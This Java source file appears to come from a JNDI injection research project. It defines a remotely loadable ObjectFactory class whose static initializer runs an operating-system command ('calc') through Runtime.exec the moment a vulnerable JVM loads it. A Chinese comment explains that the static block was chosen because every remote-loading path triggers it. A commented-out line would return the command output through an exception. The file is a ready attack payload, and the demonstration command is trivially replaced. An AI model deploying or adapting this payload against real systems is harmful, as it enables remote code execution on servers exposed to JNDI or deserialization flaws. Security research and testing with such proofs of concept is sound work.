package com.longofo.remoteclass;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.util.Hashtable;

public class ExportObject implements ObjectFactory, Serializable {

    private static final long serialVersionUID = 4474289574195395731L;

    static {
        //这里由于在static代码块中，无法直接抛异常外带数据，不过在static中应该也有其他方式外带数据。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中所有远程加载类的地方都会调用static代码块
        try {
            exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void exec(String cmd) throws Exception {
        String sb = "";
        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null)
            sb += lineStr + "\n";
        inBr.close();
        in.close();
//        throw new Exception(sb);
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
